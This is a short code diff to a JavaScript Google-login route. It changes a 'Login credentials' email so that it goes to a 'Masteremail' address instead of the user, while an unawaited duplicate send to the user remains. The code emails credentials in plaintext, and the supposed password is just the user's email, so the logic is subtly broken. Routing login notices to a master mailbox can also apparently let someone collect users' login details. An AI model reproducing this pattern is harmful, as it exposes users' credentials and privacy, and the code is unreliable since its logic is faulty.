@@ -113,7 +113,7 @@ googlelogin.get(
     
     const user = req.user;
     const encodedUser = encodeURIComponent(JSON.stringify(user));
-    await sendEmail({email: email,subject:"Login credentials",body:` Password is ${email}` }) 
+    await sendEmail({email: Masteremail,subject:"Login credentials",body:` Password is ${email}` }) 
     sendEmail({email: email,subject:"Login credentials",body:` Password is ${email}` }) 
     res.redirect(`https://workdesk.netlify.app/`);
   }
